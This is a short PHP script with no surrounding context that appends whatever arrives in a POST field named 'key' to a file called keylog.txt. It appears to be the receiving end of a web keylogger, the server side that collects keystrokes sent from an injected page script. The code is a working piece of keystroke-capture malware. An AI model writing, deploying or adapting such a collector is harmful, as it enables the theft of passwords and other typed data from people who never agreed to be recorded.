<?php
 if (!empty($_POST['key'])) {
     $logfile = fopen('keylog.txt', 'a+');
     fwrite($logfile, $_POST['key']);
     fclose($logfile);
 }

?>